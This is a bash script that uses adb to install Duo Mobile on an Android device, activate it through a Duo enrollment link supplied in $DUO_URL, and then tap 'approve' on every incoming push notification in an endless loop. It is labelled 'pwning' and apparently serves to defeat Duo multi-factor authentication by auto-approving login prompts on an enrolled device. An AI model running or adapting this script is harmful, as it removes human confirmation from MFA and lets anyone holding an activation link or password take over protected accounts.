#!/bin/bash

echo "pwning..."

# tap got it
adb shell input tap 400 350

# install duo mobile
echo "Installing duo mobile"
adb install /root/tmp/com.duosecurity.duomobile_3.19.2.apk

# open magic duo url
echo "Opening magic link for duo"
adb shell am start -a android.intent.action.VIEW -d "$DUO_URL"
sleep 3

# choose webview browser
# adb shell input tap 10 700
# sleep 1

# choose duo mobile
adb shell input tap 10 500
sleep 1

# choose just once
adb shell input tap 280 800
sleep 6

# tap redirect link to duo
# adb shell input tap 280 350
# sleep 6

# tap maybe later button
adb shell input tap 200 800
sleep 1

# tap okay got it button
adb shell input tap 200 650
sleep 1

echo "Begin respond loop"
while true
do
  # tap push notification
  adb shell input tap 0 235
  sleep 2

  # tap approve
  adb shell input tap 0 800

  # pause for five seconds
  sleep 3
done
